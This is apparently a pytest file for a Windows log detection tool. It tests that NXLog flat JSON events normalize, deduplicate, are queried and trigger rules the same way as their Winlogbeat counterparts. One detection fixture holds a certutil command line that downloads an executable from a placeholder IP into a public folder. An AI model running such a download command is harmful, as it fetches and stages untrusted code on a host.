"""Windows events shipped by NXLog's im_msvistalog input as flat JSON (to_json(), directly or through Logstash)
normalize to the typed events of the same events shipped by Winlogbeat.

The flat records are built here from the Winlogbeat fixtures, in the layout NXLog's im_msvistalog reference documents:
the System values under NXLog's names (EventID, Channel, Hostname, SourceName, RecordNumber, EventTime in the
collector's local time without a zone, ...), each EventData/UserData value at the top level under its own name, and the
pipeline's @timestamp. Values are synthetic. Equality is over everything a rule reads: family, time, host, outcome and
every typed value; origins differ by design (each names the flat field), and the flat record adds its channel spelling
and EventTime text (nxlog.*) and, when its time came from the pipeline, a caveat saying so.
"""
from __future__ import annotations

import copy
import tempfile
from datetime import UTC, datetime, timedelta, timezone
from pathlib import Path

import pytest

from romulus.detect.registry import fresh_pack
from romulus.evidence.normalize import normalize_hits
from romulus.evidence.typed import Outcome
from romulus.evidence.windows import (
    NXLOG_TIME_CAVEAT,
    WindowsInputError,
    WindowsNotNormalized,
    is_nxlog_windows,
    is_windows_source,
    normalize_windows,
    nxlog_clock_offset,
    nxlog_to_winlog,
    windows_record_key,
    windows_record_signature,
)
from romulus.evidence.windows_catalog import SECURITY, SYSMON
from romulus.hunt import sweep as sweep_module
from romulus.hunt.pivot import _windows_source_groups
from romulus.hunt.sweep import Sweep
from romulus.sources.compile import _pred, build_query
from romulus.sources.models import Completeness, Predicate, SearchIntent, SearchOutcome, Window
from romulus.sources.profile import build_profile, contract_from_types, source_os_family, source_role
from tests.test_sweep import _repo
from tests.windows_fixtures import LogicalWindowsEvent, all_logical_events, windows_hit

COLLECTOR_ZONE = timedelta(hours=-5)            # the collector's clock: EventTime is written in it, without a zone
ENVELOPE = {"EventReceivedTime": None, "SourceModuleName": "eventlog", "SourceModuleType": "im_msvistalog",
            "Keywords": "-9214364837600034816", "EventType": "AUDIT_SUCCESS", "SeverityValue": 2, "Severity": "INFO",
            "ProviderGuid": "{54849625-5478-4994-A5BA-3E3B0328C30D}", "Version": 1, "Task": 12544,
            "OpcodeValue": 0, "Category": "Example Category",
            "Opcode": "Info", "Message": "Rendered message text.", "@version": "1", "host": "collector01",
            "port": 51000, "tags": ["nxlog"]}
# Event-data names some providers share with NXLog's own fields (the log-clearing events' Channel, the Service Control
# Manager's AccountName). NXLog does not document which value it keeps; the fixture keeps the provider's, the harder
# case. EventType and Version also collide, but NXLog's values have their own domain, so those are read exactly.
AMBIGUOUS = {"Channel", "AccountName"}
LISTED = [(SECURITY, code) for code in (4624, 4625, 4688, 4720, 4732, 4768, 4769, 5140)] + [
    ("Service Control Manager", 7045), *[(SYSMON, code) for code in (1, 3, 10, 11, 13)],
    ("Microsoft-Windows-PowerShell", 4104), ("Microsoft-Windows-WMI-Activity", 5861)]


def _local(timestamp: str) -> str:
    when = datetime.fromisoformat(timestamp).astimezone(UTC) + COLLECTOR_ZONE
    return when.strftime("%Y-%m-%d %H:%M:%S")


def nxlog_hit(winlogbeat: dict, *, prefix: bool = False, lower_channel: bool = True) -> dict:
    """The NXLog flat record of a Winlogbeat record's event."""
    source = winlogbeat["_source"]
    winlog = source["winlog"]
    data = {**(winlog.get("event_data") or {}), **{k: v for k, v in (winlog.get("user_data") or {}).items()
                                                   if k != "xml_name"}}
    channel = winlog["channel"]
    # the audit result NXLog records: its EventType and the keyword mask (a signed decimal of 0x8010.../0x8020...)
    audit = {} if channel != "Security" else (
        {"EventType": "AUDIT_FAILURE", "Keywords": str(0x8010000000000000 - (1 << 64))}
        if normalize_windows(winlogbeat).outcome == Outcome.failure
        else {"EventType": "AUDIT_SUCCESS", "Keywords": str(0x8020000000000000 - (1 << 64))})
    flat = {**copy.deepcopy(ENVELOPE), **({"EventType": "INFO", "Keywords": str(0x8000000000000000 - (1 << 64))}
                                          if not audit else audit),
            "@timestamp": source["@timestamp"], "EventTime": _local(source["@timestamp"]),
            "EventReceivedTime": _local(source["@timestamp"]), "Hostname": winlog["computer_name"],
            "Channel": channel.lower() if lower_channel and channel == "Security" else channel,
            "SourceName": winlog["provider_name"], "EventID": int(winlog["event_id"]),
            "RecordNumber": int(winlog["record_id"])}
    # the System values Winlogbeat keeps under winlog.process and winlog.user
    for native, value in (("ExecutionProcessID", (winlog.get("process") or {}).get("pid")),
                          ("ExecutionThreadID", ((winlog.get("process") or {}).get("thread") or {}).get("id")),
                          ("UserID", (winlog.get("user") or {}).get("identifier")),
                          ("AccountName", (winlog.get("user") or {}).get("name"))):
        if value is not None:
            flat[native] = value
    if prefix:
        flat["EventData"] = dict(data)
    else:
        flat.update(data)
    return {"_index": "nxlog-windows", "_id": f"nx-{winlogbeat['_id']}", "_source": flat}


def _events():
    return [event for event in all_logical_events() if event.channel]      # ETW RPC calls have no event log


def comparable(event) -> dict:
    return {"family": event.family, "ts": event.ts, "host": event.host, "outcome": event.outcome,
            "fields": {name: value.value for name, value in event.fields.items() if not name.startswith("nxlog.")},
            "caveats": [caveat for caveat in event.caveats if caveat != NXLOG_TIME_CAVEAT]}


def _data_names(winlogbeat: dict) -> set[str]:
    winlog = winlogbeat["_source"]["winlog"]
    return set(winlog.get("event_data") or {}) | set(winlog.get("user_data") or {})


@pytest.mark.parametrize("shape", ["winlogbeat_8", "winlogbeat_8_real"])
@pytest.mark.parametrize("event", _events(), ids=lambda e: f"{e.channel}-{e.provider}-{e.event_id}")
def test_flat_record_types_the_same_as_its_winlogbeat_twin(event, shape):
    winlogbeat = windows_hit(event, shape)
    flat = nxlog_hit(winlogbeat)
    assert is_nxlog_windows(flat["_source"]) and is_windows_source(flat["_source"])
    twin = normalize_windows(winlogbeat)
    collided = AMBIGUOUS & _data_names(winlogbeat)
    if collided:
        # an event-data value under one of NXLog's own names cannot be told from NXLog's: never typed as event data,
        # and a channel it replaced no longer names the event's class (counted as not normalized, never misread)
        if str(flat["_source"]["Channel"]).casefold() != winlogbeat["_source"]["winlog"]["channel"].casefold():
            with pytest.raises(WindowsNotNormalized):
                normalize_windows(flat)
            return
        typed = normalize_windows(flat)
        expected = comparable(twin)
        lost = {name for name, value in twin.fields.items()
                if any(f"_data.{native}" in value.origin for native in collided)}
        assert lost and not lost & set(typed.fields)
        expected["fields"] = {name: value for name, value in expected["fields"].items() if name not in lost}
        assert comparable(typed) == expected
        return
    typed = normalize_windows(flat)
    assert comparable(typed) == comparable(twin)
    assert typed.get("nxlog.channel") == flat["_source"]["Channel"]
    assert typed.get("nxlog.event_time") == flat["_source"]["EventTime"]
    from_pipeline = typed.fields["event.created"].origin == f"{flat['_id']}:@timestamp"
    assert (NXLOG_TIME_CAVEAT in typed.caveats) == from_pipeline
    # every value is cited at the flat record's own field, never at a winlog path it does not have
    assert all("winlog." not in value.origin for value in typed.fields.values())
    assert typed.raw[0].native_id == flat["_id"] and typed.raw[0].target == "nxlog-windows"
    # one logical record in both layouts: the same deduplication identity and signature
    assert windows_record_key(flat) == windows_record_key(winlogbeat)
    assert windows_record_signature(flat) == windows_record_signature(winlogbeat)


def test_the_listed_classes_are_all_covered():
    covered = {(event.provider, event.event_id) for event in _events()}
    assert set(LISTED) <= covered


def test_origins_name_the_flat_fields_and_a_prefixed_layout_reads_the_same():
    by_key = {(event.provider, event.event_id): event for event in _events()}
    winlogbeat = windows_hit(by_key[(SECURITY, 4688)], "winlogbeat_8")
    typed = normalize_windows(nxlog_hit(winlogbeat))
    nid = "nx-" + winlogbeat["_id"]
    assert typed.fields["event.channel"].origin == f"{nid}:Channel"
    assert typed.fields["event.code"].origin == f"{nid}:EventID"
    assert typed.fields["host.full_name"].origin == f"{nid}:Hostname"
    assert typed.fields["winlog.record_id"].origin == f"{nid}:RecordNumber"
    assert typed.fields["process.command_line"].origin == f"{nid}:CommandLine"
    assert typed.fields["event.channel"].value == "Security"           # the catalog's channel, whatever the spelling
    prefixed = normalize_windows(nxlog_hit(winlogbeat, prefix=True))
    assert comparable(prefixed) == comparable(typed)
    assert prefixed.fields["process.command_line"].origin == f"{nid}:EventData.CommandLine"


def test_time_never_reads_a_zoneless_event_time_as_utc():
    by_key = {(event.provider, event.event_id): event for event in _events()}
    flat = nxlog_hit(windows_hit(by_key[(SECURITY, 4624)], "winlogbeat_8"))
    source = flat["_source"]
    typed = normalize_windows(flat)
    assert typed.ts == datetime.fromisoformat(source["@timestamp"])
    assert NXLOG_TIME_CAVEAT in typed.caveats
    # a zoned EventTime is the event's own time
    zoned = copy.deepcopy(flat)
    zoned["_source"]["EventTime"] = typed.ts.astimezone(timezone(COLLECTOR_ZONE)).isoformat()
    zoned["_source"]["@timestamp"] = "2030-01-01T00:00:00Z"                  # a late pipeline time is not used
    event = normalize_windows(zoned)
    assert event.ts == typed.ts and NXLOG_TIME_CAVEAT not in event.caveats
    assert event.fields["event.created"].origin.endswith(":EventTime")
    # with no zoned time at all the record is an error, counted under its channel's families
    del source["@timestamp"]
    with pytest.raises(WindowsInputError, match="time unresolved"):
        nxlog_to_winlog(source)
    events, skips, errors = normalize_hits([flat])
    assert events == [] and skips == {} and len(errors) == 1 and "time unresolved" in errors[0][1]
    assert sweep_module._error_tag(errors[0][1]) == "windows.security"
    assert sweep_module.DATASET_FAMILIES["windows.security"]


def test_the_collector_clock_offset_is_counted_per_shape_and_never_changes_times():
    by_key = {(event.provider, event.event_id): event for event in _events()}
    flats = [nxlog_hit(windows_hit(by_key[key], "winlogbeat_8")) for key in ((SECURITY, 4624), (SYSMON, 1))]
    receive = copy.deepcopy(flats[0])
    receive["_id"] = "late"
    receive["_source"]["RecordNumber"] += 1
    receive["_source"]["@timestamp"] = "2026-01-02T03:59:59.731Z"            # a receive time, not a parsed one
    shapes: dict = {}
    events, _skips, errors = normalize_hits([*flats, receive], shapes=shapes)
    assert errors == [] and len(events) == 3
    assert shapes == {"windows.nxlog": 3, "windows.nxlog.clock_offset:UTC-05:00": 2,
                      "windows.nxlog.clock_offset:other": 1}
    assert nxlog_clock_offset({"EventTime": "2026-01-02 03:04:05+00:00", "@timestamp": "x"}) is None


def test_copies_of_one_record_in_both_layouts_merge():
    by_key = {(event.provider, event.event_id): event for event in _events()}
    winlogbeat = windows_hit(by_key[(SECURITY, 4720)], "winlogbeat_8")
    events, skips, errors = normalize_hits([winlogbeat, nxlog_hit(winlogbeat)])
    assert errors == [] and len(events) == 1 and len(events[0].raw) == 2
    assert skips == {"duplicate Windows event copy (computer/channel/record_id)": 1}


def test_a_record_with_a_winlog_object_or_missing_markers_is_not_flat():
    assert not is_nxlog_windows({"EventID": 1, "Channel": "Security", "Hostname": "h", "SourceName": "p",
                                 "winlog": {}})
    assert not is_nxlog_windows({"EventID": 1, "Channel": "Security", "Hostname": "h"})
    assert is_nxlog_windows({"EventID": 1, "Channel": "Security", "Computer": "h", "SourceName": "p"})


# ---- retrieval ---------------------------------------------------------------------------------------------------

FLAT_TYPES = {"@timestamp": "date", "Channel": "keyword", "EventID": "long", "SourceName": "keyword",
              "Hostname": "keyword", "RecordNumber": "long", "CommandLine": "keyword", "Image": "keyword",
              "TargetUserName": "keyword", "TargetUserSid": "keyword", "SubjectUserName": "keyword",
              "ObjectType": "keyword", "User": "keyword", "IpAddress": "ip", "SourceIp": "ip"}


def test_a_flat_mapping_is_a_windows_host_target_whose_aliases_read_the_flat_names():
    assert source_os_family(FLAT_TYPES, source_role(FLAT_TYPES)) == "windows" and source_role(FLAT_TYPES) == "host"
    contract = contract_from_types("nx", FLAT_TYPES)
    assert contract.os_family == "windows"
    assert contract.fields["event.channel"].natives == ("Channel",)
    assert contract.fields["event.code"].natives == ("EventID",)
    assert contract.fields["host.name"].natives == ("Hostname",)
    assert contract.fields["winlog.record_id"].natives == ("RecordNumber",)
    assert contract.fields["process.command_line"].natives == ("CommandLine",)
    # channel and provider match without case; the computer by its short name; accounts by full or short name
    assert _pred(Predicate(field="event.channel", op="eq", value="Security"), contract) == {
        "wildcard": {"Channel": {"value": "Security", "case_insensitive": True}}}
    host = _pred(Predicate(field="host.name", op="eq", value="ws01.example.test"), contract)
    assert host["bool"]["should"][0] == {"wildcard": {"Hostname": {"value": "ws01", "case_insensitive": True}}}
    account = _pred(Predicate(field="user.entity_id", op="eq", value="name:EXAMPLE\\alice"), contract)
    assert {"wildcard": {"User": {"value": "EXAMPLE\\\\alice", "case_insensitive": True}}} in account["bool"]["should"]
    # a mixed index keeps both layouts' names in one alias
    mixed = contract_from_types("mix", {**FLAT_TYPES, "winlog.channel": "keyword", "winlog.event_id": "keyword",
                                        "winlog.provider_name": "keyword", "winlog.computer_name": "keyword"})
    assert mixed.fields["event.channel"].natives == ("winlog.channel", "Channel")
    winlogbeat_only = contract_from_types("wlb", {"@timestamp": "date", "winlog.channel": "keyword"})
    assert "winlog.record_id" not in winlogbeat_only.fields and winlogbeat_only.fields["event.channel"].natives == (
        "winlog.channel",)


def test_windows_retrieval_selects_the_flat_shape_beside_the_dataset_and_channel_groups():
    contract = contract_from_types("mix", {**FLAT_TYPES, "event.dataset": "keyword", "winlog.channel": "keyword",
                                           "winlog.event_id": "keyword", "winlog.provider_name": "keyword",
                                           "winlog.computer_name": "keyword", "winlog.record_id": "long"})
    groups = _windows_source_groups(contract)
    assert groups[-1] == [Predicate(field="Channel", op="exists"), Predicate(field="EventID", op="exists"),
                          Predicate(field="winlog.channel", op="missing")]
    query = build_query(SearchIntent(kind="raw", target="mix", window=Window(
        start=datetime(2026, 1, 1, tzinfo=UTC), end=datetime(2026, 1, 2, tzinfo=UTC)), any_of=groups), contract)
    assert {"exists": {"field": "Channel"}} in query["bool"]["should"][-1]["bool"]["filter"]
    sweep = Sweep(_repo(), None, "h1", Window(start=datetime(2026, 1, 1, tzinfo=UTC),
                                              end=datetime(2026, 1, 2, tzinfo=UTC)), {"mix": contract})
    sweep.pack = []
    any_of = sweep._any_of_for("mix", contract)
    assert any_of[-1][0] == Predicate(field="Channel", op="exists")
    winlogbeat = contract_from_types("wlb", {"@timestamp": "date", "event.dataset": "keyword",
                                             "winlog.channel": "keyword"}, os_family="windows")
    assert all(group[0].field != "Channel" for group in sweep._any_of_for("wlb", winlogbeat))
    assert sweep.stats["windows_shapes_not_assessed"]["wlb"] == [
        "windows.nxlog: not searchable on this target (Channel and EventID are not both mapped)"]


class _Client:
    settings = type("S", (), {"es_flavor": "elasticsearch"})()
    version = "8.19.0"

    def mapping(self, target):
        props = {name: {"type": kind} for name, kind in FLAT_TYPES.items()}
        return {target: {"mappings": {"properties": props}}}

    def search(self, target, body):
        self.body = body
        return {"aggregations": {"hosts": {"buckets": [{"key": {"host": "ws01.example.test"}, "doc_count": 3}]},
                                 "ds": {"buckets": []}}, "hits": {"total": {"value": 3}}}


def test_a_flat_profile_counts_hosts_by_the_computer_name():
    client = _Client()
    profile, _contract = build_profile(client, "nx")
    assert profile.os_family == "windows" and profile.hosts == {"ws01.example.test": 3}
    assert client.body["aggs"]["hosts"]["composite"]["sources"][0]["host"]["terms"]["field"] == "Hostname"


# ---- detection on both layouts -----------------------------------------------------------------------------------

def _sweep_candidates(hits: list[dict], contract) -> list[tuple]:
    times = [datetime.fromisoformat(hit["_source"]["@timestamp"]) for hit in hits]
    window = Window(start=min(times) - timedelta(seconds=1), end=max(times) + timedelta(seconds=1))

    def execute(_client, intent, _contract):
        return SearchOutcome(target=intent.target, fingerprint="f", started_at=window.start, ended_at=window.start,
                             completeness=Completeness.complete, total=len(hits), total_relation="eq",
                             returned=len(hits), records=hits)

    original = sweep_module.execute
    sweep_module.execute = execute
    try:
        with tempfile.TemporaryDirectory() as tmp:
            repo = _repo()
            sweep = Sweep(repo, None, "h1", window, {contract.target: contract}, stage_dir=Path(tmp))
            sweep.pack = [rule for rule in fresh_pack() if rule.id.startswith("win.")]
            sweep.run_partition(contract.target, contract, [], window, est=len(hits))
            sweep.finalize()
            sweep.close_stage()
            out = sorted((c["rule_id"], c["lane"], c.get("claim") or "") for c in repo.candidates("h1"))
            repo.engine.dispose()
    finally:
        sweep_module.execute = original
    return out


def test_windows_rules_find_the_same_on_both_layouts():
    by_key = {(event.provider, event.event_id): event for event in _events()}
    keys = [*LISTED, ("Microsoft-Windows-Eventlog", 1102), (SECURITY, 4719), (SECURITY, 4698), (SYSMON, 8)]
    # events whose event data uses one of NXLog's own names differ by that value (checked above), so not here
    logical = [by_key[key] for key in keys if not AMBIGUOUS & set(by_key[key].data)]
    suspicious = LogicalWindowsEvent(
        "Microsoft-Windows-Sysmon/Operational", SYSMON, 1, "ws01.example.test", 99_001, "2026-01-02T03:10:00Z",
        {**by_key[(SYSMON, 1)].data, "Image": r"C:\Windows\System32\certutil.exe",
         "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\\Users\\Public\\a.exe",
         "ParentImage": r"C:\Windows\System32\cmd.exe", "OriginalFileName": "CertUtil.exe"})
    winlogbeat = [windows_hit(event, "winlogbeat_8") for event in [*logical, suspicious]]
    flats = [nxlog_hit(hit) for hit in winlogbeat]
    wlb_contract = contract_from_types("wlb", {"@timestamp": "date", "event.dataset": "keyword",
                                               "winlog.channel": "keyword", "winlog.provider_name": "keyword",
                                               "winlog.event_id": "keyword", "winlog.computer_name": "keyword",
                                               "winlog.record_id": "long", "winlog.event_data": "flattened"},
                                       role="host", os_family="windows", hosts=("ws01.example.test",))
    flat_types = {**FLAT_TYPES, **{name: "keyword" for hit in flats for name in hit["_source"]
                                   if name not in FLAT_TYPES and not name.startswith("@") and name != "tags"}}
    flat_contract = contract_from_types("nx", flat_types, role="host", os_family="windows",
                                        hosts=("ws01.example.test",))
    found = _sweep_candidates(winlogbeat, wlb_contract)
    assert found, "the fixture must raise Windows findings"
    assert _sweep_candidates(flats, flat_contract) == found
